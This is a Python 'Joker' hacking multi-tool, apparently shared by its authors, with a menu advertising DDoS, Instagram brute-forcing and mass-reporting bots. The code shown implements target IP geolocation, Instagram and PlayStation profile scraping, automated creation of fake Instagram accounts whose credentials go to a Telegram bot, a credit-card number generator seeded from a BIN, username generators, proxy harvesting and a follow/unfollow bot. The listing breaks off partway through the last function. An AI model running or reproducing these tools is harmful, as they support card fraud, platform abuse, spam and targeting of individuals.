import os
import sys
import requests
import time
import json
import time as mm
import sys as n
from queue import Queue
from colorama import *
queue = Queue()
open_ports = []
os.system('color')
os.system('pip install os')
os.system('pip install sys')
os.system('pip install requests')
os.system('pip install time')
os.system('pip install json')
os.system('pip install socket')
os.system('pip install queue')
os.system('pip install colorama')


def slow(M):
    for c in M + '\n':
        n.stdout.write(c)
        n.stdout.flush()
        mm.sleep(1. / 120)

slow(Fore.GREEN +"""
     ██╗ ██████╗ ██╗  ██╗███████╗██████╗     
     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗    
     ██║██║   ██║█████╔╝ █████╗  ██████╔╝    
██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗    
╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║    
 ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    
             |insta : vv1ck|
           |telegram : @J_N_Q|

Logging in ...""")
time.sleep(2)


def slow(M):
    for c in M + '\n':
        n.stdout.write(c)
        n.stdout.flush()
        mm.sleep(1. / 120)

slow("""
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
The first section, information extraction :
1 >> Extract IP information
2 >> Extract Instagram information
3 >> Extract the Sony information
4 >> Extraction of the hidden anacillary
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
Department of random tools : 
5 >> Fake accounts work tool ( IG )
6 >> Visa extraction tool
7 >> User making tool
8 >> Random proxies extraction
9 >> Automatic interaction tool ( IG )
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
^ Department of attack tools  ^ :
10 >> Reporting Tool ( IG )
11 >> Attack tool on sites ( Ddos )
12 >> Brute Force insta automatic
13 >> Check the number in the snapchat
( Tools will be added soon )
14 >> Self Reporting Bot ( IG )
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
^ Checker section ^ :
15 >> Checker TIKTOK 
16 >> Checker InstaGram
17 >> Checker SnapChat
18 >> Checker Tellonym 

••••••••••••••••••••••••••••••••••••••••""")
def main():
	n = 'url'
	text = ''
	ooi = input("Put the tool number >: ")
	print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")

	if ooi == '1':
		j = input(Fore.RED +"""
[1] Get My Ip
[2] Get My Location & data
[3] Get Location & data From IP Target
		""")
		if j == "1":
			import requests
			import os
			os.system('pip install os')
			os.system('pip install requests')
			IPrequest = requests.get("https://get.geojs.io/v1/ip.json")
			myIP = IPrequest.json()["ip"]
			print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
			print("[~] My IP Address : " + myIP)
		
		
		elif j == "2":
			import requests
			import os
			os.system('pip install os')
			os.system('pip install requests')
			IPrequest = requests.get("https://get.geojs.io/v1/ip.json")
			myIP = IPrequest.json()["ip"]
			LocationR = requests.get("https://get.geojs.io/v1/ip/geo/"+myIP+".json")
			GetLocate = LocationR.json()
			print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
			print("[~]My IP Address      : " + GetLocate["ip"])
			print("[~]My Location        : " + GetLocate["country"])
			print("[~]My Country Code    : " + GetLocate["country_code"])
			print("[~]Service Provider   : " + GetLocate["organization_name"])
			print("[~]Time Zone          : " + GetLocate["timezone"])
			print("[~]Longitude On a map : " + GetLocate["longitude"])
			print("[~]Latitude On a map  : " + GetLocate["latitude"])
		
		elif j == "3":
			import requests
			import os
			os.system('pip install os')
			os.system('pip install requests')
			z = input("ip)ضع الايبي الذي تبحث عنه : ")
			LocationR = requests.get("https://get.geojs.io/v1/ip/geo/"+z+".json")
			GetLocate = LocationR.json()
			print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
			print("[~]Target IP Address         : " + GetLocate["ip"])
			print("[~]Target Location           : " + GetLocate["country"])
			print("[~]Target Country Code       : " + GetLocate["country_code"])
			print("[~]Target Time Zone          : " + GetLocate["timezone"])
			print("[~]Target Longitude On a map : " + GetLocate["longitude"])
			print("[~]Target Latitude On a map  : " + GetLocate["latitude"])
		
		else:
			print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
			print("""
Please choose one of the numbers found only
			
			     ( 1 , 2 , 3 )
			
			
			""")
			exit()
	#مالك شغل
	elif ooi == '2':
		head = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"}
		joker = """
  ──▄█████████████████████████▄──
  ▄█▀░█░█░█░░░░░░░░░░░░░░░░░░░▀█▄
  █░░░█░█░█░░░░░░░░░░░░░░█████░░█
  █░░░█░█░█░░░░░░░░░░░░░░█████░░█
  █░░░█░█░█░░░░░░░░░░░░░░█████░░█
  █░░░░░░░░░▄▄▄█████▄▄▄░░░░░░░░░█
  ███████████▀▀░░░░░▀▀███████████
  █░░░░░░░██░░▄█████▄░░██░░░░░░░█
  █░░░░░░░██░██▀░░░▀██░██░░░░░░░█
  █░░░░░░░██░██░░░░░██░██░░░░░░░█
  █░░░░░░░██░██▄░░░▄██░██░░░░░░░█
  █░░░░░░░██▄░▀█████▀░▄██░░░░░░░█
  █░░░░░░░░▀██▄▄░░░▄▄██▀░░░░░░░░█
  █░░░░░░░░░░▀▀█████▀▀░░░░░░░░░░█
  █░░░░ insta BOT ░░░░░░░░░░░░░░█
  █░░░░  tele : @J_N_Q  ░░░░░░░░█
  █░░░░  Insta :@vv1ck ░░░░░░░░░█
  ▀█▄░░░░░░░░░░░░░░░░░░░░░░░░░▄█▀
  ──▀█████████████████████████▀──
 
    """
		
		print(joker)
		
		print("""
Note that the tool will only extract what is written below :
( bio , id , name , Image )

programming : o.7ay
modification : vv1ck 
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
""")
		while 1:
			import requests
			import secrets
			import os
			os.system('pip install os')
			os.system('pip install requests')
			os.system('pip install secrets')
			cookie = secrets.token_hex(8)*2
			r = requests.Session()
			
			target = input('[+] Enter User : ')
			url_id = f'https://www.instagram.com/{target}/?__a=1'
			req_id = r.get(url_id,headers=head).json()
			bio    = str(req_id['graphql']['user']['biography'])
			url    = str(req_id['graphql']['user']['external_url'])
			nam    = str(req_id['graphql']['user']['full_name'])
			idd    = str(req_id['graphql']['user']['id'])
			isp    = str(req_id['graphql']['user']['is_private'])
			isv    = str(req_id['graphql']['user']['is_verified'])
			pro    = str(req_id['graphql']['user']['profile_pic_url'])
			print("==============================")
			print(f'[-] Insta Me @vv1ck :)\n[-] Name : {nam}\n[-] Id : {idd}\n[-] private : {isp}\n[-] verified : {isv}\n[-] Bio : {bio}\n[-] Profile picture : {pro}')
			print("===============================")
			ask = input('[+] Send To Telegram [y/n] >> ')
			if ask == "y":
				print(' ')
				ID = input('[+] Enter Telegram ID : ')
				token = input('[+] Enter Token Bot Telegram : ')
				Account = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=❖ Insta Me @vv1ck :)\n❖ Name : {nam}\n❖ Id : {idd}\n❖ private : {isp}\n❖ verified : {isv}\n❖ Bio : {bio}\n❖ Profile picture : {pro}'
				r.get(Account)
				print(f'[-] Done Send Msg to >> {ID}')
			else:
				pass
				exit()
#مالك شغل
	elif ooi == '3':
		import time
		import requests
		import json
		import os
		os.system('pip install os')
		os.system('pip install requests')
		os.system('pip install time')
		os.system('pip install json')
		
		print('Extract the Sony information !')
		print("_______________________________")
		headers = {
			"authority":"psnid.club",
			"method":"GET",
			"scheme":"https",
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"accept-encoding":"gzip, deflate, br",
			"accept-language":"ar",
			"cache-control":"max-age=0",
			"cookie":"_ga=GA1.2.1390894457.1600196162; _gid=GA1.2.821570641.1600196166",
			"sec-fetch-dest":"document",
			"sec-fetch-mode":"navigate",
			"sec-fetch-site":"none",
			"sec-fetch-user":"?1",
			"upgrade-insecure-requests":"1",
			"user-agent":"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
}
		
		x = input("What is the name whose information you want to extract? :")
		data = {"id": x}
		url = (f"https://psnid.club/api/psn/profile?id="+x)
		r = requests.get(url,headers=headers,data=data)
		if r.text.find("onlineId") >=0:
			ri = str(r.json()['region'])
			about = str(r.json()['aboutMe'])
			print("[+] region:", ri)
			print("[+] bio:", about)
			plus = str(r.json()['plus'])
			if "0" in plus:
				print("[-] No plus")
			else:
				print("[+] have Plus")
				pla = str(r.json()['trophySummary']['earnedTrophies']['platinum'])
				gol = str(r.json()['trophySummary']['earnedTrophies']['gold'])
				silve = str(r.json()['trophySummary']['earnedTrophies']['silver'])
				bro = str(r.json()['trophySummary']['earnedTrophies']['bronze'])
				print("[+] bronze:", bro)
				print("[+] silver:", silve)
				print("[+] gold:", gol)
				print("[+] platinum:", pla)
				print("[/] Click ENTER to exit ")
				out2 = input("")
				exit()
		else:
				print("[x] Error:Not Found")
				print("[/] Click ENTER to exit")
				out = input("")
				exit()
		#مالك شغل 
	elif ooi == '4':
		import requests
		import json
		import pyfiglet 
		import os
		os.system('pip install os')
		os.system('pip install requests')
		os.system('pip install json')
		os.system('pip install pyfiglet')
		rs = requests.session()
		joker = """
  ──▄█████████████████████████▄──
  ▄█▀░█░█░█░░░░░░░░░░░░░░░░░░░▀█▄
  █░░░█░█░█░░░░░░░░░░░░░░█████░░█
  █░░░█░█░█░░░░░░░░░░░░░░█████░░█
  █░░░█░█░█░░░░░░░░░░░░░░█████░░█
  █░░░░░░░░░▄▄▄█████▄▄▄░░░░░░░░░█
  ███████████▀▀░░░░░▀▀███████████
  █░░░░░░░██░░▄█████▄░░██░░░░░░░█
  █░░░░░░░██░██▀░░░▀██░██░░░░░░░█
  █░░░░░░░██░██░░░░░██░██░░░░░░░█
  █░░░░░░░██░██▄░░░▄██░██░░░░░░░█
  █░░░░░░░██▄░▀█████▀░▄██░░░░░░░█
  █░░░░░░░░▀██▄▄░░░▄▄██▀░░░░░░░░█
  █░░░░░░░░░░▀▀█████▀▀░░░░░░░░░░█
  █░░░░   Whoo ?  ░░░░░░░░░░░░░░█
  █░░░░  tele : @J_N_Q  ░░░░░░░░█
  █░░░░  Insta :@vv1ck ░░░░░░░░░█
  ▀█▄░░░░░░░░░░░░░░░░░░░░░░░░░▄█▀
  ──▀█████████████████████████▀──
 
    """
		
		print(joker)
		
		print("""
programming : faalh999
modification : vv1ck 

     E᙭TᖇᗩᑕTIᑎG TᕼE ᕼIᗪᗪEᑎ ᗩᑕᑕOᑌᑎT
""")
		print("〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️")
		username = input("Enter user :")
		password = input("Enter pass :")
		Target = input("Target :")
		url = 'https://www.instagram.com/accounts/login/ajax/'
		
		headers = {
			'accept': '*/*',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
			'content-length': '275',
			'content-type': 'application/x-www-form-urlencoded',
			'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
			'origin': 'https://www.instagram.com',
			'referer': 'https://www.instagram.com/',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
			'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
			'x-ig-app-id': '936619743392459',
			'x-ig-www-claim': '0',
			'x-instagram-ajax': 'bc3d5af829ea',
			'x-requested-with': 'XMLHttpRequest'
    }
		
		data = {
			'username': f'{username}',
			'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
			'queryParams': '{}',
			'optIntoOneTap': 'false'
    }    
		r = rs.post(url, headers=headers, data=data)
		if  'authenticated": true' in r.text:
			print("")
			print("*"*25)	
			print("")
			print("Done Login :"+username)
			try:
				u = rs.get("https://www.instagram.com/{Target}/?__a=1")
				id =  str(u.json()["graphql"]["user"]["id"])
				print("{Target} : {id}")
				print("")
				print("*"*25)
			except:
				print(R+"Sent too many requests, try later")
				exit()	
			s =rs.get('https://www.instagram.com/graphql/query/?query_hash=303a4ae99711322310f25250d988f3b7&variables={"reel_ids":["%s"],"tag_names":[],"location_ids":[],"highlight_reel_ids":[],"precomposed_overlay":false,"show_story_viewer_list":true,"story_viewer_fetch_count":50}'%(id))
			ss = json.loads(s.content.decode())
			if len(ss['data']['reels_media'])>0:
				print("")
				print("Usernames hidden in thelstory :")
				print("")
				for i in ss['data']['reels_media']:
					da = i['items']
					if len(da)>0:
						for ii in da:
							if len(ii['tappable_objects'])>0:
								for iii in ii['tappable_objects']:
									user = iii['username']
									print(f"username :{G+user}")       
							else:
								print("لا يوجد يوزرات مخفية ♨️")
		elif '{"message": "checkpoint_required"' in r.text:
			print("Checkpoint")
		else:
			print(" Error ...")

#مالك شغل
	elif ooi == '5':
		import os
		import requests
		import random
		import secrets 
		from time import sleep
		from user_agent import generate_user_agent
		os.system('pip install requests')
		os.system('pip install os')
		os.system('pip install random')
		os.system('pip install secrets')
		joker = """
  ──▄█████████████████████████▄──
  ▄█▀░█░█░█░░░░░░░░░░░░░░░░░░░▀█▄
  █░░░█░█░█░░░░░░░░░░░░░░█████░░█
  █░░░█░█░█░░░░░░░░░░░░░░█████░░█
  █░░░█░█░█░░░░░░░░░░░░░░█████░░█
  █░░░░░░░░░▄▄▄█████▄▄▄░░░░░░░░░█
  ███████████▀▀░░░░░▀▀███████████
  █░░░░░░░██░░▄█████▄░░██░░░░░░░█
  █░░░░░░░██░██▀░░░▀██░██░░░░░░░█
  █░░░░░░░██░██░░░░░██░██░░░░░░░█
  █░░░░░░░██░██▄░░░▄██░██░░░░░░░█
  █░░░░░░░██▄░▀█████▀░▄██░░░░░░░█
  █░░░░░░░░▀██▄▄░░░▄▄██▀░░░░░░░░█
  █░░░░░░░░░░▀▀█████▀▀░░░░░░░░░░█
  █░░░░ insta BOT ░░░░░░░░░░░░░░█
  █░░░░  tele : @J_N_Q  ░░░░░░░░█
  █░░░░  Insta :@vv1ck ░░░░░░░░░█
  ▀█▄░░░░░░░░░░░░░░░░░░░░░░░░░▄█▀
  ──▀█████████████████████████▀──
 
    """
		
		print(joker)
		
		
		print("""
The function of the tool is to create fake accounts on Instagram and send the account to Telegram
〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️
""")
		print('====================================')
		def Make():
			while 1:
				idd    = 'X5uC6wALAAF-Lw3oSZE9kuY0mP_9'
				r      = requests.Session()
				cookie = secrets.token_hex(8)*2
				chars  = 'abcdefghijklmnopqrstuvwxyz123456789'
				myID   = input('[+] Enter you id : ')
				if myID == "":
					print('[!] Error id !')
					exit()
				else:
					token   = input('[+] Enter Token : ')
					pass
					phone  = input('[+] Enter Telephone number : ')
					if phone == "":
						print('[!] Error number ')
						exit()
					else:
						pass
					userr  = ""
					passs  = ""
					for x in range(0,3):
						userr_char = random.choice(chars)
						userr      = userr + userr_char
					for i in range(0,8):
						passs_char = random.choice(chars)
						passs      = passs + passs_char
						paas   = passs
						user   = (f'vv1ck{userr}')
						name   = 'By @J_N_Q / @o.7ay'
						url1   = 'https://www.instagram.com/accounts/web_create_ajax/attempt/'
						url2   = 'https://www.instagram.com/accounts/send_signup_sms_code_ajax/'
						url3   = 'https://www.instagram.com/accounts/web_create_ajax/'
						
					head = {
            'HOST': "www.instagram.com",
            'KeepAlive' : 'True',
            'user-agent' : generate_user_agent(),
            'Cookie': cookie,
            'Accept' : "*/*",
            'ContentType' : "application/x-www-form-urlencoded",
            "X-Requested-With" : "XMLHttpRequest",
            "X-IG-App-ID": "936619743392459",
            "X-Instagram-AJAX" : "missing",
            "X-CSRFToken" : "missing",
            "Accept-Language" : "en-US,en;q=0.9"
        }
					data1 = {
            'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(paas),
            'phone_number': phone,
            'username': user,
            'first_name': name,
            'month': '1',
            'day': '1',
            'year': '1999',
            'client_id': idd,
            'seamless_login_enabled': '1',
            'opt_into_one_tap': 'fals'
        }
					data2 = {
            'client_id': idd,
            'phone_number': phone,
            'phone_id': '',
            'big_blue_token': ''
        }
					Make_Acc1 = r.post(url1,headers=head,data=data1)
					Make_Acc2 = r.post(url2,headers=head,data=data2)
					if 'Looks like your phone number may be incorrect.' in Make_Acc2.text:
						print('[!] Error number ')
						exit()
					elif 'Please wait a few minutes before you try again.' in Make_Acc2.text:
						print('[!] Please wait a little')
						exit()
					elif 'true' in Make_Acc2.text:
						print('[-] sent succesfully')
						pass
					else:
						print('[!] Error ..')
						exit()
					code = input('[+] Enter code : ')
					data3 = {
            'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(paas),
            'phone_number': phone,
            'username': user,
            'first_name': name,
            'month': '1',
            'day': '1',
            'year': '1999',
            'sms_code': code,
            'client_id': idd,
            'seamless_login_enabled': '1',
            'tos_version': 'row'
        }
					Make_Acc3 = r.post(url3,headers=head,data=data3)
					if "That code isn't valid." in Make_Acc3.text:
						print("[!] Error code !")
						exit()
					elif 'true' in Make_Acc3.text:
						print("[-] The account has been created")
						pass
					elif "checkpoint_required" in Make_Acc3.text:
						print('[!] Done, checkpoint required')
						pass
					else:
						print(Make_Acc3.text)
						print('[!] Error ..')
						exit()
					Account = 'https://api.telegram.org/bot{}/sendMessage?chat_id={}&text=❖ Fake Insta Account :)\n❖ User : {}\n❖ Pass : {}\n❖ Coded By : @vv1ck'.format(token,myID,user,paas)
					r.get(Account)
		Make()
		
#wer6
			
	elif ooi == '6':
		gs = """

<---------------------------------------->
        | (𝑇) Alert tool is free  |
        |  The tool needs a vpn   | 
        |     JOKER and 𝙿𝙰𝙽𝙰𝙳𝙾𝙻    |

<---------------------------------------->
"""
		
		print(gs)
		print("          ☠︎︎ 𝐂𝐂𝐆𝐞𝐧𝐫𝐚𝐭𝐨𝐫 𝐅𝐫𝐞𝐞        ")
		print("                                           ")
		import random
		import os 
		os.system('pip install os')
		os.system('pip install random')
		
		print(" Enter bin ✅")
		bin = input('BIN: ')
		def cc(gen):
			ll = 10
			lst = ''
			while len(lst) != ll:
				rr = random.choice(gen)
				lst += rr
			return lst
		def dt(cvv):
			cvl = 3
			ccv = ''
			while len(ccv) != cvl:
				cvg = random.choice(cvv)
				ccv += cvg
			return ccv
		def da(nn):
			pop = 2
			das = '0'
			while len(das) != pop:
				deo = random.choice(nn)
				das += deo
				return das
		def tte(ewe):
			ttp = 4
			fdd = '202'
			while len(fdd) != ttp:
				rweh = random.choice(ewe)
				fdd += rweh
			return fdd
		ewe = '123456'
		cvv = '1234567890' 
		gen = '1234567890'
		nn = '123456789'
		if len(bin) > 6:
			print('The Bin Most Be Less Than 7 Numbers')
			exit()
		while len(bin) < 6:
			bin += random.choice(cvv)
		for i in range(55):
			print(bin+cc(gen)+'|'+da(nn)+'|'+tte(ewe)+'|'+dt(cvv))
		print('Been completed ✅.')
		print(" Go check them out ✔️")
		
#wer7
			
	elif ooi == '7':
		import random
		import os
		os.system('pip install os')
		os.system('pip install random')
		print("""
Note: After completion, the tool will put the accounts in an external file automatically
""")
		print("1- Semi triple (-) :")
		print("2- Semi triple (.) :")
		print("3- random : ")
		sa = input("Choose :")
		os.system("COLOR A")
		if sa == "1":
			print("Where is her place?")
			print("1| (_***)")
			print("2| (*_**)")
			print("3| (**_*)")
			print("4| (***_)")
			da = input("Choose :")
			if da == "1":
				uesr = '_'
				chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'  # ارقام واحرف لو ترغب
				amount = input('How many accounts? :')
				amount = int(amount)
				length2 = 3
				length2 = int(length2)
				for password in range(amount):
					password = ''
					for item in range(length2):
						password = ''
					for item in range(length2):
						password += random.choice(chars2)
					bb= uesr + password
					print(bb)
					with open('user.txt', 'a') as x:
						x.write(bb + '\n')
			if da == "2":
				uesr = '_' 
				chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
				amount = input('How many accounts?')
				amount = int(amount)
				length2 = 3
				ength2 = int(length2)
				for password in range(amount):
					password = ''
					for item in range(length2):
						password = ''
					for item in range(length2):
						password = random.choice(chars2)
					for item in range(2):
						password1 = ''
					for item in range (2):
						password1 += random.choice(chars2)
					ba = password + uesr + password1
					print(ba)
					with open('user.txt', 'a') as x:
						x.write(ba +'\n')
			if da == "3":
				uesr = '_' 
				chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789' 
				amount = input('How many accounts? ')
				amount = int(amount)
				length2 = 3
				length2 = int(length2)
				for password in range(amount):
					password = ''
					for item in range(2):
						password = ''
					for item in range(2):
						password += random.choice(chars2)
					for item in range(1):
						password1 = ''
					for item in range(1):
						password1 += random.choice(chars2)
					bd = password + uesr + password1
					print(bd)
					with open('user.txt', 'a') as x:
						x.write(bd + '\n')
			if da == "4":
				uesr = '_' 
				chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789' 
				amount = input('How many accounts?')
				amount = int(amount)
				length2 = 3
				length2 = int(length2)
				for password in range(amount):
					password = ''
					for item in range(3):
						password = ''
					for item in range(3):
						password += random.choice(chars2)
					bc= password + uesr
					print(bc)
					with open('user.txt', 'a') as x:
						x.write(bc + '\n')
			if sa == "2":
				print("Where is her place?")
				print("1| .***")
				print("2| *.**")
				print("3| **.*")
				print("4| ***.")
				da = input("Choose :")
				if da == "1":
					uesr = '.'
					chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
					amount = input('How many accounts?')
					amount = int(amount)
					length2 = 3
					length2 = int(length2)
					for password in range(amount):
						password = ''
						for item in range(length2):
							password = ''
						for item in range(length2):
							password += random.choice(chars2)
						bb= uesr + password
						print(bb)
						with open('user.txt', 'a') as x:
							x.write(bb + '\n')
			if da == "2":
				uesr = '.'
				chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
				amount = input('How many accounts?')
				amount = int(amount)
				length2 = 3
				length2 = int(length2)
				for password in range(amount):
					password = ''
					for item in range(length2):
						password = ''
					for item in range(length2):
						password = random.choice(chars2)
					for item in range(2):
						password1 = ''
					for item in range (2):
						password1 += random.choice(chars2)
					ba = password + uesr + password1
					print(ba)
					with open('user.txt', 'a') as x:
						x.write(ba +'\n')
			if da == "3":
				uesr = '.'
				chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
				amount = input('How many accounts?')
				amount = int(amount)
				length2 = 3
				length2 = int(length2)
				for password in range(amount):
					password = ''
				for item in range(2):
					password = ''
				for item in range(2):
					password += random.choice(chars2)
				for item in range(1):
					password1 = ''
				for item in range(1):
					password1 += random.choice(chars2)
				bd = password + uesr + password1
				print(bd)
				with open('user.txt', 'a') as x:
					x.write(bd + '\n')
			if da == "4":
				uesr = '.'
				chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
				amount = input('How many accounts?')
				amount = int(amount)
				length2 = 3
				length2 = int(length2)
				for password in range(amount):
					password = ''
					for item in range(3):
						password = ''
					for item in range(3):
						password += random.choice(chars2)
					bc= password + uesr
					print(bc)
					with open('user.txt', 'a') as x:
						x.write(bc + '\n')
			if sa == "3":
				uesr = '.'
				chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
				amount = input('How many accounts?')
				amount = int(amount)
				length2 = 3
				length2 = int(length2)
				for password1 in range(amount):
					password1 = ''
					for item in range(length2):
						password1 = ''
					for item in range(length2):
						password1 += random.choice(chars2)
						password35="."+password1
						password2 = ''
					for item in range(length2):
						password2 = ''
					for item in range(length2):
						password2 = random.choice(chars2)
					for item in range(2):
						password3 = ''
					for item in range (2):
						password3 += random.choice(chars2)
					password27=password2+"."+password3
					password4 = ''
					for item in range(2):
						password4 = ''
					for item in range(2):
						password4 += random.choice(chars2)
					for item in range(1):
						password5= "."
					for item in range(1):
						password5+=random.choice(uesr)
					for item in range(1):
						password99 = ''
					for item in range(1):
						password99 += random.choice(chars2)
					password9 = password4+password5+password99
					
					useer = '_'
					chars2 = 'qwertyuiopasdfghjklzxcvbnm0123456789'
					
					
					for password109 in range(amount):
						password109 = ''
						for item in range(length2):
							password109 = ''
						for item in range(length2):
							password109 += random.choice(chars2)
						password350 = "_" + password109
						password20 = ''
						for item in range(length2):
							password20 = ''
						for item in range(length2):
							password20 = random.choice(chars2)
						for item in range(2):
							password30 = ''
						for item in range(2):
							password30 += random.choice(chars2)
						password270 = password20 + "_" + password30
						password40 = ''
						
						for item in range(2):
							password40 = ''
						for item in range(2):
							password40 += random.choice(chars2)
						for item in range(1):
							password50 = ""
						for item in range(1):
							password50 += random.choice(useer)
						for item in range(1):
							password990 = ''
						for item in range(1):
							password990 += random.choice(chars2)
						password90 = password40 + password50 + password990
						password60 = ''
						
						for item in range(3):
							password60 = ''
						for item in range(3):
							password60 += random.choice(chars2)
						password100 = password60 + "_"
					mylist = [password9,password27,password35,password100,password90,password270,password350]
					passwordff=""
					ddd = passwordff+random.choice(mylist)
					print(ddd)
					with open('user.txt', 'a') as x:
						x.write(ddd + '\n')
#wer8
	elif ooi == '8':
		import requests
		import time
		import os
		os.system('pip install os')
		os.system('pip install requests')
		os.system('pip install time')
		
		http = 'https://www.proxy-list.download/api/v1/get?type=http'
		https = 'https://www.proxy-list.download/api/v1/get?type=https'
		banner = ("""
[!] Free By : @vv1ck @o.7ay
 _____  ____________ _______   ____   __
|  __ \ | ___ \ ___ \  _  \ \ / /\ \ / /
| |  \/ | |_/ / |_/ / | | |\ V /  \ V / 
| | __  |  __/|    /| | | |/   \   \ /  
| |_\ \ | |   | |\ \\ \_/ / /^\ \  | |  
 \____/ \_|   \_| \_|\___/\/   \/  \_/  
""")
		print(banner)
		print('='*18)
		while 1:
			typp = input("""
[1] HTTP Proxies
[2] HTTPS Proxies

[+] Choice One >> """)
			if typp == '1':
				try:
					r1 = requests.get(http)
					pp = r1.text.split('\r\n')
					sp = ""
					for i in pp:
						 sp += str(f'{i}\n')
						 pw = open('HTTPP.txt','w').write(sp)
						 print(sp)
						 print(f'[-] Done Grabe Proxies and Save in HTTPP.txt')
						 time.sleep(2)
				except:
						 	print('[!] Cheack Your Internet ,and try agin')
						 	time.sleep(2)
						 	break
			elif typp == '2':
				try:
					r1 = requests.get(https)
					pp = r1.text.split('\r\n')
					sp = ""
					for i in pp:
						sp += str(f'{i}\n')
						pw = open('HTTPS.txt','w').write(sp)
						print(sp)
						print(f'[-] Done Grabe Proxies and Save in HTTPS.txt')
						time.sleep(2)
				except:
					print('[!] Cheack Your Internet ,and try agin')
					time.sleep(2)
					break
			else:
				print('[!] Please choice one option')
				exit()
	
	
	elif ooi == '9':
		import requests
		import time 
		import os
		from time import sleep
		os.system('pip install os')
		os.system('pip install requests')
		os.system('pip install time')
		print("""
       @vv1ck
██╗███╗   ██╗███████╗████████╗ █████╗        
██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗       
██║██╔██╗ ██║███████╗   ██║   ███████║       
██║██║╚██╗██║╚════██║   ██║   ██╔══██║       
██║██║ ╚████║███████║   ██║   ██║  ██║██╗    
╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝ 
Automatic interaction tool ( IG )
""")
			
		username = input("Enter your Username: ")
		password = input("Enter your password: ")
		s = requests.session()
		logheader = {'accept': '*/*', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.instagram.com', 'referer': 'https://www.instagram.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36', 'x-csrftoken': 'missing', 'x-requested-with': 'XMLHttpRequest'}
			
			
		def log():
			logurl = 'https://www.instagram.com/accounts/login/ajax/'
			data = {
        'username': username,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:' + password}
			
			loginreq = s.post(logurl, data=data, headers=logheader)
			if ('"authenticated": false') in loginreq.text:
				print("False Login")
			elif ('"authenticated": true') in loginreq.text:
				print("True Login" + ' »»', username)
				print("Increasing followers now do not close the page ...")
				for i in range(11):
					idd = ['407474340', '1950713662', '7993793340', '1606183110', '534649695', '2540710248', '1925510241', '2872859990'
                  '1399564099', '2273694343', '1119431451', '1782327804']
					
					for ids in idd:
						logheader["x-csrftoken"] = loginreq.cookies["csrftoken"]
						flwurl = 'https://www.instagram.com/web/friendships/' + str(ids) + '/follow/'
						reqflw = s.post(flwurl, headers=logheader)
					sleep(90)
					for ids in idd:
						logheader["x-csrftoken"] = loginreq.cookies["csrftoken"]
						flwurl1 = 'https://www.instagram.com/web/friendships/' + str(ids) + '/unfollow/'
						reqflw1 = s.post(flwurl1, headers=logheader)
						print(f"Done ({str(i)}/11)")
			elif ('"message": "checkpoint_required"') in loginreq.text:
				print("Secure account" + ' »»', username)
				f = loginreq.json()
				urlb = str(f['checkpoint_url'])
				mm = f'{urlb}'
